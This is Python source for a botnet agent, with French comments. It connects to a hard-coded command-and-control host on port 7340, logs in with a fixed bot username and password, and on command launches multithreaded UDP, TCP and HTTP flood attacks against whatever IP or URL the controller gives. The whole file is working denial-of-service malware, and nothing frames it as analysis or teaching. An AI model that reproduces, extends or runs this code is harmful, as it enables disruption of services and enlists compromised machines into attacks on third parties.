import socket
import threading
import time
import random
import sys
import os

# Configuration par defaut (sera remplace par main.py)
C2_ADDRESS  = "nlzpsjlvr.localto.net"
C2_PORT     = 7340

def attack_udp(ip, port, secs, size):
    while time.time() < secs:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            dport = random.randint(1, 65535) if port == 0 else port
            data = random._urandom(size)
            for _ in range(100):
                s.sendto(data, (ip, dport))
            s.close()
        except:
            pass

def attack_tcp(ip, port, secs, size):
    while time.time() < secs:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            data = random._urandom(size)
            for _ in range(100):
                s.send(data)
            s.close()
        except:
            pass

def attack_http(ip, port, secs):
    while time.time() < secs:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            req = f"GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: Mozilla/5.0\r\nConnection: keep-alive\r\n\r\n".encode()
            for _ in range(100):
                s.send(req)
            s.close()
        except:
            pass

def main():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            s.connect((C2_ADDRESS, int(C2_PORT)))
            
            # Handshake
            while True:
                data = s.recv(1024).decode(errors='ignore')
                if 'MODE (BotC2,NixC2,MY_SQL)' in data:
                    s.send('BotC2'.encode())
                elif 'Username' in data:
                    s.send('BOT'.encode())
                elif 'Password' in data:
                    s.send('\xff\xff\xff\xff\75'.encode('cp1252'))
                    break
            
            # Command Loop
            while True:
                data = s.recv(4096).decode(errors='ignore').strip()
                if not data:
                    break
                
                args = data.split(' ')
                command = args[0].upper()
                
                if command == '.UDP':
                    # .UDP IP PORT TIME SIZE ...
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    size = int(args[4])
                    threads = int(args[6])
                    for _ in range(threads):
                        threading.Thread(target=attack_udp, args=(ip, port, secs, size), daemon=True).start()
                        
                elif command == '.TCP':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    size = int(args[4])
                    threads = int(args[6])
                    for _ in range(threads):
                        threading.Thread(target=attack_tcp, args=(ip, port, secs, size), daemon=True).start()

                elif command in ['.HTTP', '.HTTP_REQ', '.HTTP_ALL']:
                    # Simplification pour HTTP standard
                    url = args[1]
                    # Extraire IP/Port basique (tres simplifie)
                    try:
                        target = url.split('://')[1].split('/')[0]
                        if ':' in target:
                            ip, port = target.split(':')
                            port = int(port)
                        else:
                            ip = target
                            port = 80
                    except:
                        continue
                        
                    secs = time.time() + int(args[3])
                    threads = int(args[-1]) # Souvent le dernier arg
                    for _ in range(threads):
                        threading.Thread(target=attack_http, args=(ip, port, secs), daemon=True).start()
                
                elif command == 'PING':
                    s.send('PONG'.encode())
                    
        except Exception as e:
            time.sleep(5)

if __name__ == '__main__':
    main()
